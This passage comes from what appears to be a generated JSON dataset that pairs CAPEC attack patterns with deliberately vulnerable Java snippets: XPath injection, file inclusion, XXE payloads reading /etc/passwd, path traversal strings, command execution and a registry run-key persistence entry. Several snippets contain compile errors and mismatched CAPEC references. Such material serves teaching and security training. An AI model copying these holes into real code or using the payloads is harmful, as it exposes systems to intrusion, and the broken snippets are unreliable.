        "description": "This Java code snippet demonstrates a vulnerability related to 'Improper Neutralization of Special Elements used in a Command' (CWE-77) and 'Improper Neutralization of Special Elements used in an OS Command' (CWE-78). The code reads a command from user input and directly executes it using the Runtime.getRuntime().exec() method. This can lead to command injection, where an attacker can inject malicious commands. The code represents the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how untrusted input can be used to manipulate terminal commands, leading to potential security risks."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import javax.xml.xpath.XPath; \nimport javax.xml.xpath.XPathExpressionException; \nimport javax.xml.xpath.XPathFactory; \nimport org.w3c.dom.Document; \nimport javax.xml.parsers.DocumentBuilder; \nimport javax.xml.parsers.DocumentBuilderFactory; \nimport java.io.StringReader; \nimport javax.xml.transform.stream.StreamSource; \n\npublic class XMLInjectionExample { \n    public static void main(String[] args) { \n        String userInput = \"' or '1'='1\"; // Malicious input \n        String xmlData = \"<users><user><id>1</id><name>John</name></user></users>\"; \n        try { \n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); \n            DocumentBuilder builder = factory.newDocumentBuilder(); \n            Document doc = builder.parse(new InputSource(new StringReader(xmlData))); \n            XPathFactory xPathFactory = XPathFactory.newInstance(); \n            XPath xPath = xPathFactory.newXPath(); \n            String expression = \"/users/user[id/text() = '\" + userInput + \"']/name/text()\"; \n            String result = xPath.evaluate(expression, doc); \n            System.out.println(\"Result: \" + result); \n        } catch (Exception e) { \n            e.printStackTrace(); \n        } \n    } \n}",
        "description": "This Java code snippet demonstrates an XML Injection vulnerability. The code takes user input and constructs an XPath expression without proper input validation or neutralization. The user input is directly embedded into the XPath query, allowing an attacker to manipulate the query structure. In this example, the malicious input \"' or '1'='1\" is used to bypass the intended query logic, potentially exposing or altering sensitive data. This snippet embodies the main idea of CAPEC-91 (XML Injection) and related CWEs, such as CWE-643 (XPath Injection) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.util.*;\n\npublic class LocalCodeInclusion {\n    private static final String BASE_PATH = \"/usr/local/app/libs/\";\n    private static Map<String, String> trustedLibraries = new HashMap<>();\n\n    static {\n        // Trusted libraries\n        trustedLibraries.put(\"lib1\", \"lib1_v1.0.jar\");\n        trustedLibraries.put(\"lib2\", \"lib2_v2.0.jar\");\n    }\n\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java LocalCodeInclusion <library>\");\n            return;\n        }\n\n        String library = args[0];\n        try {\n            loadLibrary(library);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void loadLibrary(String library) throws Exception {\n        String libraryPath = BASE_PATH + library;\n        File libFile = new File(libraryPath);\n\n        if (!libFile.exists()) {\n            throw new FileNotFoundException(\"Library not found: \" + libraryPath);\n        }\n\n        // Simulate loading the library\n        System.out.println(\"Loading library: \" + libraryPath);\n        // In a real scenario, this could be a dynamic class loading\n        // For example: URLClassLoader.newInstance(new URL[]{libFile.toURI().toURL()}).loadClass(\"SomeClass\");\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of Local Code Inclusion vulnerability. The program attempts to load a library file from a specified local directory based on user input. The `loadLibrary` method constructs the file path using the base path and the user-provided library name, then checks if the file exists before simulating the loading of the library. This code is vulnerable because it allows an attacker to specify any file name, potentially leading to the inclusion of malicious or outdated libraries. The code also relies on global variables (`BASE_PATH` and `trustedLibraries`), which can be manipulated, and does not properly control dynamically-managed code resources, making it susceptible to various attacks."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class LocalFileInclusionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        if (filePath != null) {\n            File file = new File(filePath);\n            if (file.exists() && file.isFile()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found or is not a file.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a local file inclusion vulnerability. The servlet reads a 'file' parameter from the HTTP request and attempts to read and display the contents of the specified file. This code is vulnerable because it does not properly validate or sanitize the 'file' parameter, allowing an attacker to specify any file path on the server. This can lead to the inclusion and execution of arbitrary files, potentially exposing sensitive information or enabling further attacks. The code snippet embodies the main idea of CAPEC-126 (PHP Local File Inclusion) by showing how an attacker can exploit improper control of file paths to include and execute local files. The related CWEs provide additional context on the types of weaknesses that can lead to such vulnerabilities, such as improper input validation and reliance on external variables."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class RemoteCodeInclusion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            String remoteUrl = \"http://example.com/maliciousCode.js\";\n            URL url = new URL(remoteUrl);\n            URLConnection connection = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder code = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine).append(\"\\n\");\n            }\n            in.close();\n\n            // Simulate execution of the downloaded code\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            executeCode(code.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeCode(String code) {\n        // This is a placeholder for executing the downloaded code\n        // In a real scenario, this could be a JavaScript engine or similar\n        System.out.println(\"Executing code: \" + code);\n    }\n}",
        "description": "This Java code snippet demonstrates a Remote Code Inclusion vulnerability. The main idea is to download and execute code from a remote location without verifying its integrity (CWE-494). The code fetches a JavaScript file from a specified URL and simulates its execution. This represents the inclusion of functionality from an untrusted control sphere (CWE-829). The code is vulnerable because it does not perform any checks to ensure the downloaded code is safe or from a trusted source, potentially allowing an attacker to execute malicious code."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xml = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                     \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                     \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xml)));\n\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability (CAPEC-228) by parsing an XML document that includes an external entity reference. The XML document contains a DTD that defines an entity 'xxe' which references the local file '/etc/passwd'. The code does not properly restrict the use of external entities, leading to potential exposure of sensitive information. The DocumentBuilderFactory is configured to allow external entities, which is a common mistake leading to CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). This example highlights the importance of securing XML parsers to prevent such vulnerabilities."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import javax.xml.soap.*;\n\npublic class SOAPArrayOverflowExample {\n    public static void main(String[] args) {\n        try {\n            // Create a SOAP message\n            MessageFactory messageFactory = MessageFactory.newInstance();\n            SOAPMessage soapMessage = messageFactory.createMessage();\n            SOAPPart soapPart = soapMessage.getSOAPPart();\n\n            // Create SOAP envelope and body\n            SOAPEnvelope envelope = soapPart.getEnvelope();\n            SOAPBody soapBody = envelope.getBody();\n\n            // Create a SOAP element with an array\n            SOAPElement arrayElement = soapBody.addChildElement(\"ArrayElement\");\n            arrayElement.addAttribute(envelope.createName(\"size\"), \"3\");\n\n            // Add more elements than specified in the size attribute\n            for (int i = 0; i < 5; i++) {\n                arrayElement.addChildElement(\"Item\").addTextNode(\"Item \" + i);\n            }\n\n            // Process the SOAP message\n            processSOAPMessage(soapMessage);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void processSOAPMessage(SOAPMessage soapMessage) {\n        try {\n            SOAPBody soapBody = soapMessage.getSOAPBody();\n            SOAPElement arrayElement = (SOAPElement) soapBody.getChildElements().next();\n            int size = Integer.parseInt(arrayElement.getAttribute(\"size\"));\n\n            // Allocate buffer based on the specified size\n            String[] items = new String[size];\n\n            // Read elements into the buffer without checking actual number of elements\n            int index = 0;\n            for (Iterator<?> it = arrayElement.getChildElements(); it.hasNext(); index++) {\n                SOAPElement item = (SOAPElement) it.next();\n                items[index] = item.getValue();\n            }\n\n            // Print the items\n            for (String item : items) {\n                System.out.println(item);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP array overflow vulnerability. The main idea is to create a SOAP message with an array element that specifies a size attribute of 3 but actually contains 5 items. The `processSOAPMessage` method naively trusts the size attribute and allocates a buffer of size 3. It then attempts to read all elements into this buffer without checking the actual number of elements, leading to a potential buffer overflow. This example embodies the CAPEC description and related CWEs by showing how improper handling of length parameters and buffer sizes can lead to vulnerabilities."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class TransactionLogger {\n    private Map<String, String> transactions = new HashMap<>();\n\n    public void addTransaction(String transactionId, String data) {\n        transactions.put(transactionId, data);\n        logTransaction(transactionId, data);\n    }\n\n    private void logTransaction(String transactionId, String data) {\n        try (FileWriter fw = new FileWriter(\"transaction.log\", true)) {\n            fw.write(\"Transaction ID: \" + transactionId + \", Data: \" + data + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        TransactionLogger logger = new TransactionLogger();\n        logger.addTransaction(\"12345\", \"Sensitive Data\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a transaction logging system. The `TransactionLogger` class stores transaction data in a HashMap and logs each transaction to a file named `transaction.log`. The `logTransaction` method writes transaction details, including potentially sensitive data, directly to the log file without any encryption or access control. This embodies the deprecated CAPEC 'Abuse of Transaction Data Structure' by showing how transaction data can be improperly handled and exposed. The related CWEs highlight the issues of failing to protect stored data from modification (CWE-217), failing to provide confidentiality for stored data (CWE-218), and information exposure through log files (CWE-534 and CWE-533)."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdateClient {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 8080);\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n\n        // Send authentication details (vulnerable to capture-replay attack)\n        String authDetails = \"username=admin&password=admin\";\n        out.write(authDetails.getBytes());\n        out.flush();\n\n        // Receive application code update (vulnerable to sniffing)\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[1024];\n        while ((nRead = in.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n        buffer.flush();\n        byte[] appCode = buffer.toByteArray();\n\n        // Save the received code to a file\n        FileOutputStream fos = new FileOutputStream(\"appUpdate.jar\");\n        fos.write(appCode);\n        fos.close();\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable client application that connects to a server to receive an application code update. The client sends authentication details in plain text, making it susceptible to capture-replay attacks (CWE-294). The application code update is received over an unencrypted connection, making it vulnerable to passive sniffing (CAPEC-65). The code also demonstrates the use of client-side authentication (CWE-603), as the server does not verify the authentication details, relying solely on the client to perform the check. This combination of vulnerabilities highlights the risks associated with insecure communication and authentication mechanisms."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerablePatchUpdater {\n    public static void main(String[] args) throws IOException {\n        String serverAddress = \"http://example.com/patch\";\n        URL url = new URL(serverAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // Vulnerable: No server-side authentication, relying on client-side check\n        if (authenticateClient()) {\n            InputStream inputStream = connection.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // Simulate patch application\n            }\n            reader.close();\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    // Vulnerable: Client-side authentication\n    private static boolean authenticateClient() {\n        // Simulate client-side authentication\n        return true; // Always returns true, bypassable\n    }\n}",
        "description": "This Java code snippet represents a vulnerable patch updater that fetches and applies patches from a server. The main vulnerability lies in the use of client-side authentication (CWE-603), which can be easily bypassed by an attacker. The code fetches the patch data from a server without proper server-side authentication, making it susceptible to capture-replay attacks (CWE-294) where an attacker can sniff the network traffic and replay it to bypass authentication. This embodies the main idea of the deprecated CAPEC, which involves passively sniffing and capturing application code during patching."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            // Simulate client-side authentication\n            String clientMessage = in.readLine();\n            if (\"AUTH_TOKEN\".equals(clientMessage)) {\n                out.println(\"Authenticated\");\n            } else {\n                out.println(\"Authentication Failed\");\n            }\n\n            // Echo server functionality\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                out.println(inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that performs client-side authentication. The server listens on port 8080 and spawns a new thread for each client connection. The `ClientHandler` class simulates client-side authentication by checking if the received message equals 'AUTH_TOKEN'. If the message matches, the client is considered authenticated; otherwise, authentication fails. This approach is vulnerable to capture-replay attacks (CWE-294) because an attacker can sniff the 'AUTH_TOKEN' and replay it to bypass authentication. Additionally, the authentication logic is performed on the client side (CWE-603), making it easy to bypass by modifying the client. The code demonstrates the main idea of CAPEC-65, where an attacker can sniff and capture application code or authentication tokens during initial distribution or communication."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableFuzzingExample {\n    private static final Logger LOGGER = Logger.getLogger(VulnerableFuzzingExample.class.getName());\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/mydatabase\";\n    private static final String DB_USER = \"user\";\n    private static final String DB_PASSWORD = \"password\";\n\n    public static void main(String[] args) {\n        String userInput = args[0]; // Assume user input is passed as a command-line argument\n        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n            String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n            try (PreparedStatement statement = connection.prepareStatement(query);\n                 ResultSet resultSet = statement.executeQuery()) {\n                while (resultSet.next()) {\n                    System.out.println(\"User: \" + resultSet.getString(\"username\"));\n                }\n            }\n        } catch (SQLException e) {\n            LOGGER.log(Level.SEVERE, \"Database error: \" + e.getMessage(), e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a database query that is susceptible to SQL injection attacks. The code takes user input directly from the command-line arguments and constructs an SQL query without proper input validation or neutralization of special elements. This can allow an attacker to manipulate the SQL query to access sensitive information. Additionally, the error handling mechanism logs detailed error messages, which may expose sensitive information about the database structure or other internal details. This example embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract information beyond what is intended, leveraging weaknesses such as improper input validation (CWE-20), SQL injection (CWE-89), and exposure of sensitive information through error messages (CWE-209)."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableFileProcessor {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableFileProcessor <file_path>\");\n            return;\n        }\n\n        String filePath = args[0];\n        File file = new File(filePath);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (!filePath.endsWith(\".txt\")) {\n            System.out.println(\"Invalid file type. Only .txt files are allowed.\");\n            return;\n        }\n\n        try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                // Process the file line by line\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            System.out.println(\"Error reading file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file processing application. The application takes a file path as an argument and attempts to read and print the contents of the file. The code checks the file extension to ensure it is a .txt file (CWE-646), but this is insufficient to guarantee the file's safety. If the file is corrupted or malicious, it could cause the application to fail or behave unexpectedly (CAPEC-160: Force Use of Corrupted Files). Additionally, the code does not properly handle the inclusion of functionality from untrusted sources (CWE-829) and allows potentially dangerous file types to be processed (CWE-434). This can lead to various security issues, including denial of service or execution of malicious code."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableCode {\n    // CWE-1108: Excessive Reliance on Global Variables\n    private static String configPath = System.getenv(\"CONFIG_PATH\");\n\n    public static void main(String[] args) {\n        // CWE-1106: Insufficient Use of Symbolic Constants\n        String defaultConfigPath = \"/etc/default/config\";\n\n        // CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\n        String config;\n\n        if (configPath != null) {\n            config = configPath;\n        } else {\n            config = defaultConfigPath;\n        }\n\n        // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        try {\n            Runtime.getRuntime().exec(\"sh -c \" + config);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the main idea of CAPEC-13: Subverting Environment Variable Values. The code retrieves an environment variable 'CONFIG_PATH' and uses it to construct a command that is executed by the runtime. This can be exploited if an attacker can manipulate the 'CONFIG_PATH' environment variable to inject malicious commands. The code also demonstrates several related CWEs: \n- CWE-1108: Excessive reliance on the global variable 'configPath'.\n- CWE-1106: Use of a literal constant for the default configuration path instead of a symbolic constant.\n- CWE-1126: Declaration of the 'config' variable with unnecessarily wide scope.\n- CWE-95: The use of 'Runtime.getRuntime().exec' without proper neutralization of the input, leading to potential command injection."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class VulnerableCode {\n    // Global variable that can be manipulated\n    public static String userRole = \"guest\";\n\n    public static void main(String[] args) {\n        // Simulate user input\n        String inputRole = args[0];\n        setUserRole(inputRole);\n\n        // Check user role\n        if (userRole.equals(\"admin\")) {\n            System.out.println(\"Access granted to admin functionality.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static void setUserRole(String role) {\n        // Improper control of dynamically-identified variable\n        userRole = role;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to excessive reliance on global variables and improper control of dynamically-identified variables. The global variable 'userRole' is used to determine access levels within the application. The 'setUserRole' method allows the user to set this global variable based on input, which can be manipulated to gain unauthorized access. This embodies the main idea of CAPEC-77: Manipulating User-Controlled Variables, and highlights related CWEs such as CWE-1108 (Excessive Reliance on Global Variables) and CWE-914 (Improper Control of Dynamically-Identified Variables)."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class CanonicalizationExample {\n    public static void main(String[] args) {\n        String userInput = \"..\\..\\etc\\passwd\";\n        if (isValidPath(userInput)) {\n            String canonicalPath = canonicalize(userInput);\n            System.out.println(\"Canonical Path: \" + canonicalPath);\n        } else {\n            System.out.println(\"Invalid Path\");\n        }\n    }\n\n    public static boolean isValidPath(String path) {\n        // Validate the path before canonicalization (Incorrect Behavior Order)\n        String regex = \"^[a-zA-Z0-9_/]+$\";\n        return Pattern.matches(regex, path);\n    }\n\n    public static String canonicalize(String path) {\n        // Simplified canonicalization logic\n        return path.replace(\"..\", \"\").replace(\"\\\\\", \"/\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerability related to the deprecated CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code first validates the user input path using a regex pattern before canonicalizing it. This is problematic because the validation step occurs before canonicalization, potentially allowing malicious input to bypass validation and be transformed into a harmful path. The canonicalization function then attempts to sanitize the path by removing '..' and replacing backslashes with forward slashes. This order of operations can lead to security issues, such as directory traversal attacks."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import java.io.UnsupportedEncodingException;\nimport java.net.URLDecoder;\nimport java.util.regex.Pattern;\n\npublic class VulnerableEncodingExample {\n    public static void main(String[] args) {\n        String userInput = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded input representing \"../../etc/passwd\"\n        try {\n            // CWE-180: Validate before canonicalize\n            if (isValidInput(userInput)) {\n                String decodedInput = URLDecoder.decode(userInput, \"UTF-8\");\n                // CWE-73: External control of file name or path\n                readFile(decodedInput);\n            } else {\n                System.out.println(\"Invalid input detected.\");\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // CWE-20: Improper input validation\n        // CWE-692: Incomplete denylist to cross-site scripting\n        String denylistPattern = \"[<>%]\";\n        return !Pattern.compile(denylistPattern).matcher(input).find();\n    }\n\n    private static void readFile(String filePath) {\n        // Simulate file reading operation\n        System.out.println(\"Reading file: \" + filePath);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where user input is validated before being canonicalized (CWE-180). The user input is URL-encoded to represent a path traversal attack (\"../../etc/passwd\"). The `isValidInput` method uses an incomplete denylist (CWE-692) to validate the input, which fails to detect the malicious payload. After validation, the input is decoded using `URLDecoder.decode`, which reveals the harmful path. The `readFile` method then uses this decoded input to simulate a file read operation, illustrating the potential for an external control of file name or path (CWE-73). This example embodies the CAPEC concept of leveraging alternate encoding to bypass input validation mechanisms."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogManipulationExample {\n    private static final Logger logger = Logger.getLogger(LogManipulationExample.class.getName());\n    private static final String LOG_FILE = \"application.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Simulate logging sensitive information\n            logSensitiveInfo(\"User password: 12345\");\n\n            // Simulate log manipulation\n            manipulateLog(\"User password: 12345\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred\", e);\n        }\n    }\n\n    private static void logSensitiveInfo(String info) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(info + \"\\n\");\n        }\n    }\n\n    private static void manipulateLog(String fakeLogEntry) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(fakeLogEntry + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can manipulate audit logs due to insufficient access controls and improper output neutralization. The `logSensitiveInfo` method logs sensitive information (CWE-532) without proper neutralization (CWE-117), and the `manipulateLog` method simulates an attacker injecting a fake log entry. This represents the CAPEC of Audit Log Manipulation, where an attacker can inject, manipulate, or delete log entries to mislead audits or cover tracks. The code highlights vulnerabilities such as logging sensitive information, improper output neutralization, and the potential for log manipulation."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        Preferences prefs = Preferences.userRoot().node(\"/com/example/app\");\n        // CWE-314: Cleartext Storage in the Registry\n        prefs.put(\"password\", \"mySecretPassword\");\n        System.out.println(\"Password stored in registry.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of registry manipulation by storing a sensitive piece of information (a password) in cleartext within the Windows registry. The code uses the `Preferences` API to interact with the registry, specifically storing the password under a specific node. This embodies the main idea of the deprecated CAPEC pattern 'Registry Manipulation' and highlights CWE-314, which is the cleartext storage of sensitive information in the registry. Storing sensitive data in cleartext can lead to security vulnerabilities, as unauthorized users or malicious software could easily access and misuse this information."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryRunKeyModifier {\n    public static void main(String[] args) {\n        // Obtain the user preferences node for the package\n        Preferences prefs = Preferences.userRoot().node(\"com.example\");\n\n        // Add a new entry to the run key\n        prefs.put(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyMaliciousApp\", \"C:\\\\path\\\\to\\\\malicious.exe\");\n\n        // Store sensitive information in cleartext (CWE-314)\n        prefs.put(\"SensitiveInfo\", \"password123\");\n\n        System.out.println(\"Registry run key modified and sensitive information stored.\");\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might modify the Windows registry to add a new entry to the 'run keys' so that a malicious application is executed when a user logs in. The code uses the Preferences API to interact with the registry, which is a common way to manage user-specific settings in Java. The snippet also includes an example of storing sensitive information in cleartext within the registry, which is a security weakness (CWE-314). This code represents the main idea of the CAPEC by showing how an attacker can achieve persistence on a target system by modifying registry run keys and highlights the associated weaknesses that can be exploited."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SchemaPoisoningExample {\n    public static void main(String[] args) {\n        String schemaPath = \"config/schema.xml\";\n        String maliciousSchema = \"<schema><element name='user' type='string'/><element name='password' type='string'/></schema>\";\n\n        // CWE-15: External Control of System or Configuration Setting\n        try {\n            Files.write(Paths.get(schemaPath), maliciousSchema.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate application reading the corrupted schema\n        try {\n            String schemaContent = new String(Files.readAllBytes(Paths.get(schemaPath)));\n            System.out.println(\"Loaded Schema: \" + schemaContent);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of schema poisoning. The code writes a malicious schema to a configuration file (CWE-15: External Control of System or Configuration Setting). The application then reads and prints the corrupted schema, which could lead to improper handling of user data. This example highlights the risk of allowing external control over system configurations, which can lead to security vulnerabilities such as denial of service, unexpected states, or incomplete data recording."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"AUTH user:password\");\n\n            // Read the server's response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a communication protocol. The code establishes a socket connection to a server at 'example.com' on port 8080 and sends an authentication message ('AUTH user:password') without verifying the source of the communication channel (CWE-940). The response from the server is read and printed without ensuring message integrity (CWE-924). Additionally, the code does not protect against capture-replay attacks (CWE-294) or reflection attacks (CWE-301). This example embodies the main idea of CAPEC-272 (Protocol Manipulation) by showing how improper handling of communication protocols can lead to various security vulnerabilities."
    },
    {
